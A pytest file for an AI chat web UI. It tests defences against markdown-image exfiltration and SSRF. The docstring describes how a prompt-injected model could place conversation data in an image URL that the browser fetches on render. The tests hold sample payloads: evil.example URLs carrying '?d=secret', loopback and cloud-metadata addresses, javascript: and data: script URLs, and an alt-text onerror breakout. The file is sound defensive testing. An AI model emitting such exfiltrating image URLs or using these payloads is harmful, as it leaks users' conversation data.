"""The web UI loads only the server's own images by itself.

Reported 2026-11-22 by tai: a markdown image in an answer became an `<img>`
and the browser fetched it as soon as the answer rendered, with no click. A
model that read a prompt injection could put conversation data into such a
URL (`![x](https://host/a.png?d=...)`), and rendering sent it to that host;
the same for a loopback or intranet address. Two layers now stop that:

- `ppxai/web/shared/image-policy.js` (marked's image renderer, installed by
  `app.js::setupMarkdown`) loads a relative path, the page's own origin,
  `data:image/...` and `blob:`; any other image becomes a link;
- `GET /` sends `Content-Security-Policy: img-src 'self' data: blob:`.

An HTTPS image from another host is a link until the user allows web images
for the conversation (a bar on the message names the hosts and how many URLs
carry a query). Then it loads through `GET /files/remote-image`
(`ppxai/server/routes/remote_image.py`), which fetches public addresses only
and needs a key that only the served page knows.

VSCode's webview CSP (`default-src 'none'`, no `img-src`) already blocks
remote images; the TUIs fetch none.
"""

from __future__ import annotations

import asyncio
import json
import pathlib
import shutil
import subprocess

import httpx
import pytest

from ppxai.server.routes import remote_image, static

ROOT = pathlib.Path(__file__).resolve().parent.parent
POLICY_JS = ROOT / "ppxai" / "web" / "shared" / "image-policy.js"
MARKED_JS = ROOT / "ppxai" / "web" / "lib" / "marked.min.js"
APP_JS = ROOT / "ppxai" / "web" / "app.js"
INDEX_HTML = ROOT / "ppxai" / "web" / "index.html"
NODE = shutil.which("node")
ORIGIN = "http://127.0.0.1:54320"

needs_node = pytest.mark.skipif(NODE is None, reason="node is required")


def _node(script: str) -> str:
    out = subprocess.run([NODE, "-e", f"const p = require({json.dumps(str(POLICY_JS))});" + script],
                         capture_output=True, text=True, timeout=30)
    assert out.returncode == 0, out.stderr
    return out.stdout


def _render(markdown: str, origin: str = ORIGIN, allow: bool = False) -> str:
    """Render through the real marked + the real policy, the way app.js does."""
    return _node(
        f"const {{marked}} = require({json.dumps(str(MARKED_JS))});"
        f"const origin = {json.dumps(origin)};"
        f"const opts = {{allowRemote: {json.dumps(allow)},"
        " proxyUrl: (u) => origin + '/files/remote-image?url=' + encodeURIComponent(u) + '&key=K'};"
        "marked.use({renderer: {image(h, t, x) { return p.imageHtml(h, t, x, origin, opts); }}});"
        f"process.stdout.write(marked.parse({json.dumps(markdown)}));"
    )


@needs_node
class TestTheRendererLoadsOnlyTheServersImages:
    @pytest.mark.parametrize("src", [
        "https://evil.example/a.png?d=secret",
        "http://evil.example/a.png",
        "//evil.example/a.png",
        "\\\\\\\\evil.example/a.png",  # two backslashes after markdown unescapes
        "/\\\\evil.example/a.png",
        "http://127.0.0.1:8080/admin.png",
        "http://localhost:54320/x.png",
        "http://192.168.1.1/x.png",
        "ftp://evil.example/x.png",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
    ])
    def test_another_origin_is_not_loaded(self, src):
        html = _render(f"see ![leak]({src}) here")
        assert "<img" not in html

    def test_a_remote_image_becomes_a_link_naming_its_host(self):
        html = _render("![chart](https://evil.example/a.png?d=secret)")
        assert 'class="external-image"' in html
        assert 'href="https://evil.example/a.png?d=secret"' in html
        assert "evil.example" in html and 'rel="noopener noreferrer"' in html

    @pytest.mark.parametrize("src", [
        f"{ORIGIN}/files/image/plot.png?session=abc",
        "/files/image/plot.png",
        "img/plot.png",
        "data:image/png;base64,iVBORw0KGgo=",
        "blob:http://127.0.0.1:54320/1234",
    ])
    def test_the_servers_own_images_load(self, src):
        html = _render(f"![plot]({src})")
        assert "<img" in html and "external-image" not in html

    def test_a_hub_prefixed_server_url_is_the_same_origin(self):
        html = _render(f"![p]({ORIGIN}/hub/h/pop-os/files/image/p.png)")
        assert "<img" in html

    def test_alt_text_cannot_break_out(self):
        html = _render('![x" onerror="alert(1)](https://evil.example/a.png)')
        assert "onerror=\"" not in html
        html = _render('![x" onerror="alert(1)](img/a.png)')
        assert "onerror=\"" not in html

    @pytest.mark.parametrize("src", [
        "/files/remote-image?url=https%3A%2F%2Fevil.example%2F%3Fd%3Dsecret&key=K",
        f"{ORIGIN}/files/remote-image?url=https%3A%2F%2Fevil.example%2F",
        "files/remote-image?url=x",
        "/files/remote%2Dimage?url=x",
        f"{ORIGIN}/hub/h/pop-os/files/remote-image/?url=x",
    ])
    def test_the_server_fetch_route_is_not_a_way_around_asking(self, src):
        assert "<img" not in _render(f"![x]({src})")
        assert "<img" not in _render(f"![x]({src})", origin="null")

    def test_no_page_origin_loads_only_relative_and_data(self):
        assert "<img" not in _render(f"![p]({ORIGIN}/x.png)", origin="null")
        assert "<img" in _render("![p](img/x.png)", origin="null")


@needs_node
class TestAllowedWebImagesLoadThroughTheServer:
    def test_an_allowed_https_image_loads_via_the_fetch_route(self):
        html = _render("![chart](https://cdn.example/a.png?d=1)", allow=True)
        assert 'class="remote-image"' in html
        assert 'src="http://127.0.0.1:54320/files/remote-image?url=https%3A%2F%2Fcdn.example%2Fa.png%3Fd%3D1&amp;key=K"' in html
        assert 'referrerpolicy="no-referrer"' in html
        assert "evil" not in html

    @pytest.mark.parametrize("src", ["http://cdn.example/a.png", "ftp://cdn.example/a.png",
                                     "https://user:pw@cdn.example/a.png"])
    def test_only_https_without_credentials_is_ever_fetched(self, src):
        html = _render(f"![x]({src})", allow=True)
        assert "<img" not in html and "remote-image" not in html

    def test_a_link_carries_what_the_bar_and_the_allow_button_need(self):
        html = _render("![a <b>](https://cdn.example/a.png)")
        assert 'data-src="https://cdn.example/a.png"' in html
        assert 'data-alt="a &amp;lt;b&amp;gt;"' in html

    def test_the_bar_names_the_hosts_and_the_urls_with_a_query(self):
        out = _node(
            "const s = p.summarize(['https://a.example/x.png?d=secret', 'https://b.example/y.png',"
            " 'https://a.example/z.png?']);"
            "process.stdout.write(JSON.stringify([s, p.consentText(s)]));")
        summary, text = json.loads(out)
        assert summary == {"count": 3, "hosts": ["a.example", "b.example"], "withQuery": 1}
        assert "3 web images not loaded, from a.example, b.example." in text
        assert "1 of them has a query string" in text

    def test_the_bar_escapes_host_names(self):
        out = _node("process.stdout.write(p.consentText({count: 1, hosts: ['<b>x'], withQuery: 0}));")
        assert "<b>" not in out and "&lt;b&gt;x" in out


class TestTheWebUiUsesIt:
    def test_app_js_installs_the_image_renderer(self):
        src = APP_JS.read_text(encoding="utf-8")
        start = src.index("setupMarkdown() {")
        body = src[start:src.index("// === Server Connection ===", start)]
        assert "image: (href, title, text) =>" in body
        assert "PpxaiImagePolicy" in body and "imageHtml(" in body

    def test_app_js_asks_before_loading_web_images(self):
        src = APP_JS.read_text(encoding="utf-8")
        assert "this.setupImageConsent();" in src
        start = src.index("setupImageConsent() {")
        body = src[start:src.index("// === Server Connection ===", start)]
        assert "new MutationObserver(" in body
        assert "Load images in this conversation" in body
        assert "_imagesAllowedFor.add(this._imageConversationKey())" in body
        assert "PPXAI_REMOTE_IMAGE_KEY" in src[src.index("_remoteImageUrl(url) {"):start]
        # A failed fetch goes back to a link and is not retried in a loop.
        assert "dataset.failed" in body and ":not([data-failed])" in body

    def test_index_loads_the_policy_before_app_js(self):
        html = INDEX_HTML.read_text(encoding="utf-8")
        assert html.index('src="shared/image-policy.js"') < html.index('src="app.js')


class TestTheIndexPageSendsTheCsp:
    def test_img_src_is_self_data_and_blob(self, tmp_path, monkeypatch):
        (tmp_path / "index.html").write_text("<html><head></head><body></body></html>",
                                             encoding="utf-8")
        monkeypatch.setattr(static, "WEB_UI_DIR", tmp_path)
        resp = asyncio.run(static.serve_index())
        assert resp.status_code == 200
        assert resp.headers["content-security-policy"] == "img-src 'self' data: blob:"

    def test_the_page_carries_the_fetch_key(self, tmp_path, monkeypatch):
        (tmp_path / "index.html").write_text("<html><head></head><body></body></html>",
                                             encoding="utf-8")
        monkeypatch.setattr(static, "WEB_UI_DIR", tmp_path)
        body = asyncio.run(static.serve_index()).body.decode()
        assert f"window.PPXAI_REMOTE_IMAGE_KEY = {json.dumps(remote_image.REMOTE_IMAGE_KEY)};" in body

    def test_only_img_src_is_restricted(self):
        # A script-src or connect-src here would break the UI (inline
        # schema script, SSE, the hub); this header is about images only.
        assert [d.split()[0] for d in static.INDEX_CSP.split(";")] == ["img-src"]


PNG = b"\x89PNG\r\n\x1a\n" + b"0" * 32


def _fetch(handler, url="https://cdn.example/a.png", addresses=("93.184.216.34",), monkeypatch=None):
    async def fake_getaddrinfo(host, port, type=0):
        found = addresses(host) if callable(addresses) else addresses
        return [(2, 1, 6, "", (a, port)) for a in found]

    async def go():
        loop = asyncio.get_running_loop()
        monkeypatch.setattr(loop, "getaddrinfo", fake_getaddrinfo)
        async with httpx.AsyncClient(transport=httpx.MockTransport(handler),
                                     follow_redirects=False, trust_env=False) as client:
            return await remote_image.fetch_remote_image(url, client)
    return asyncio.run(go())


def _png(request):
    return httpx.Response(200, headers={"content-type": "image/png"}, content=PNG)


class TestTheServerFetchesOnlyPublicImages:
    @pytest.mark.parametrize("address", [
        "127.0.0.1", "10.0.0.5", "172.16.0.1", "192.168.1.1", "169.254.169.254",
        "100.64.0.1", "0.0.0.0", "224.0.0.1", "::1", "fe80::1", "fc00::1", "::ffff:127.0.0.1",
    ])
    def test_a_non_public_address_is_refused(self, address):
        assert not remote_image.is_public_address(address)

    @pytest.mark.parametrize("address", ["93.184.216.34", "2606:4700:4700::1111"])
    def test_a_public_address_is_allowed(self, address):
        assert remote_image.is_public_address(address)

    def test_it_connects_to_the_checked_address_and_names_the_host(self, monkeypatch):
        seen = []

        def handler(request):
            seen.append(request)
            return _png(request)
        data, ctype = _fetch(handler, monkeypatch=monkeypatch)
        assert (data, ctype) == (PNG, "image/png")
        [req] = seen
        assert req.url.host == "93.184.216.34"
        assert req.headers["host"] == "cdn.example"
        assert req.extensions["sni_hostname"] == "cdn.example"
        assert "cookie" not in req.headers and "referer" not in req.headers

    def test_a_host_resolving_to_a_local_address_is_refused(self, monkeypatch):
        with pytest.raises(remote_image.RemoteImageError, match="not a public address"):
            _fetch(_png, addresses=("127.0.0.1",), monkeypatch=monkeypatch)

    def test_one_local_address_among_public_ones_is_refused(self, monkeypatch):
        with pytest.raises(remote_image.RemoteImageError):
            _fetch(_png, addresses=("93.184.216.34", "10.0.0.1"), monkeypatch=monkeypatch)

    @pytest.mark.parametrize("url", ["http://cdn.example/a.png", "https://u:p@cdn.example/a.png",
                                     "https://127.0.0.1/a.png", "https://[::1]/a.png"])
    def test_the_url_itself_is_checked(self, url, monkeypatch):
        with pytest.raises(remote_image.RemoteImageError):
            _fetch(_png, url=url, monkeypatch=monkeypatch)

    def test_a_redirect_to_a_local_host_is_refused(self, monkeypatch):
        def handler(request):
            if request.headers["host"] == "cdn.example":
                return httpx.Response(302, headers={"location": "https://intranet.local/x.png"})
            return _png(request)

        def addresses(host):
            return ["10.1.2.3"] if host == "intranet.local" else ["93.184.216.34"]
        with pytest.raises(remote_image.RemoteImageError, match="not a public address"):
            _fetch(handler, addresses=addresses, monkeypatch=monkeypatch)

    def test_a_redirect_to_http_is_refused(self, monkeypatch):
        def handler(request):
            return httpx.Response(301, headers={"location": "http://cdn.example/a.png"})
        with pytest.raises(remote_image.RemoteImageError, match="only https"):
            _fetch(handler, monkeypatch=monkeypatch)

    def test_redirects_are_capped(self, monkeypatch):
        def handler(request):
            return httpx.Response(302, headers={"location": "/again"})
        with pytest.raises(remote_image.RemoteImageError, match="redirects"):
            _fetch(handler, monkeypatch=monkeypatch)

    @pytest.mark.parametrize("ctype", ["image/svg+xml", "text/html", ""])
    def test_only_raster_images_are_returned(self, ctype, monkeypatch):
        def handler(request):
            return httpx.Response(200, headers={"content-type": ctype}, content=b"<svg/>")
        with pytest.raises(remote_image.RemoteImageError, match="not a raster image"):
            _fetch(handler, monkeypatch=monkeypatch)

    def test_a_large_image_is_refused(self, monkeypatch):
        monkeypatch.setattr(remote_image, "MAX_BYTES", 16)

        def handler(request):
            return httpx.Response(200, headers={"content-type": "image/png"}, content=PNG)
        with pytest.raises(remote_image.RemoteImageError, match="larger"):
            _fetch(handler, monkeypatch=monkeypatch)


class TestTheFetchRouteNeedsThePagesKey:
    @pytest.mark.parametrize("key", ["", "wrong"])
    def test_without_the_key_nothing_is_fetched(self, key, monkeypatch):
        async def never(*a, **k):
            raise AssertionError("fetched without the key")
        monkeypatch.setattr(remote_image, "fetch_remote_image", never)
        resp = asyncio.run(remote_image.remote_image(url="https://cdn.example/a.png", key=key))
        assert resp.status_code == 403

    def test_with_the_key_the_image_comes_back_locked_down(self, monkeypatch):
        async def fake(url, client):
            return PNG, "image/png"
        monkeypatch.setattr(remote_image, "fetch_remote_image", fake)
        resp = asyncio.run(remote_image.remote_image(url="https://cdn.example/a.png",
                                                     key=remote_image.REMOTE_IMAGE_KEY))
        assert resp.status_code == 200 and resp.body == PNG
        assert resp.headers["x-content-type-options"] == "nosniff"
        assert "sandbox" in resp.headers["content-security-policy"]

    def test_a_refused_url_is_a_403_with_the_reason(self, monkeypatch):
        resp = asyncio.run(remote_image.remote_image(url="http://cdn.example/a.png",
                                                     key=remote_image.REMOTE_IMAGE_KEY))
        assert resp.status_code == 403 and b"only https" in resp.body
